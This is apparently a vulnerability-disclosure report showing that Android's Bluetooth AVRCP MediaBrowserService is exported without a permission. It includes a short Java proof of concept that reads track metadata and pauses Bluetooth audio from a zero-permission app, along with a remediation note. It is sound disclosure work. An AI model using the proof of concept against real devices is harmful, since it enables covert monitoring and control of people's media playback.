# VRP Report #41: Bluetooth AVRCP MediaBrowserService — Audio Metadata Leak + Playback Control

## Summary
The Bluetooth AVRCP Controller's `BluetoothMediaBrowserService` is exported without any permission restriction. Any installed app can connect via the `MediaBrowser` API, obtain the `MediaSession` token, and monitor audio metadata playing over Bluetooth (from a connected source device) — including track titles, artists, albums — and control playback, all without any permissions or user consent.

## Affected Component
| Attribute | Value |
|-----------|-------|
| App | Bluetooth (AOSP/Google) |
| Package | `com.google.android.bluetooth` |
| Component | `com.android.bluetooth.avrcpcontroller.BluetoothMediaBrowserService` |
| Type | Service (MediaBrowserServiceCompat) |
| Exported | `true` |
| Permission | NONE |

## Static Code Evidence

### onGetRoot() — Zero Caller Validation
`BluetoothMediaBrowserService.java` line 229-231:
```java
@Override
public MediaBrowserServiceCompat.BrowserRoot onGetRoot(String str, int i, Bundle bundle) {
    Log.i(TAG, "Browser Client Connection Request, client='" + str + "')");
    return new MediaBrowserServiceCompat.BrowserRoot(BrowseTree.ROOT, getDefaultStyle());
}
```
**Accepts ALL callers** — logs the client package name but performs zero validation. Returns `BrowseTree.ROOT` to any connecting app.

### AvrcpCoverArtProvider — Also Exported Without Permission
Additionally, `AvrcpCoverArtProvider` (authority: `com.android.bluetooth.avrcpcontroller.AvrcpCoverArtProvider`) is exported with no permission. Its `openFile()` takes `device` (MAC address) and `uuid` query parameters to return album cover art images.

## Systemic Issue — MediaBrowserService Anti-Pattern
This is the THIRD instance of the same vulnerability class across Google apps:

| # | App | Service | Permission | Impact |
|---|-----|---------|-----------|--------|
| VRP #39 | YouTube | MainAppMediaBrowserService | NONE | Video viewing leak |
| VRP #40 | YouTube Music | MusicBrowserService | NONE | Music listening leak |
| VRP #41 | Bluetooth AVRCP | BluetoothMediaBrowserService | NONE | Bluetooth audio leak |

All three have `onGetRoot()` that returns a valid root to any caller without checking package name, UID, or signature.

## Proof of Concept
```java
// Zero-permission app connects to Bluetooth's MediaBrowserService
MediaBrowser browser = new MediaBrowser(context,
    new ComponentName("com.google.android.bluetooth",
        "com.android.bluetooth.avrcpcontroller.BluetoothMediaBrowserService"),
    new MediaBrowser.ConnectionCallback() {
        @Override
        public void onConnected() {
            MediaSession.Token token = browser.getSessionToken();
            MediaController ctrl = new MediaController(context, token);

            // LEAKED: Current Bluetooth audio track metadata
            MediaMetadata md = ctrl.getMetadata();
            String title = md.getString(MediaMetadata.METADATA_KEY_TITLE);
            String artist = md.getString(MediaMetadata.METADATA_KEY_ARTIST);

            // CONTROL: Pause/play/skip Bluetooth audio
            ctrl.getTransportControls().pause();
        }
    }, null);
browser.connect();
```

## Impact

### Confidentiality (MEDIUM)
- Leaks audio track metadata from Bluetooth-connected sources (car stereo, headphones)
- Track title, artist, album, duration exposed
- Combined with YouTube (#39) and YouTube Music (#40) leaks, enables comprehensive media consumption profiling

### Integrity (MEDIUM)
- Unauthorized playback control (pause, play, skip, seek) of Bluetooth audio

### Attack Complexity: LOW
- Zero permissions required
- Standard Android MediaBrowser API
- No user interaction needed

## Remediation
Add caller validation in `onGetRoot()` — check connecting package against an allowlist (e.g., SystemUI, Media apps with MEDIA_CONTENT_CONTROL permission), or add `android:permission` to the service declaration in the manifest.

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
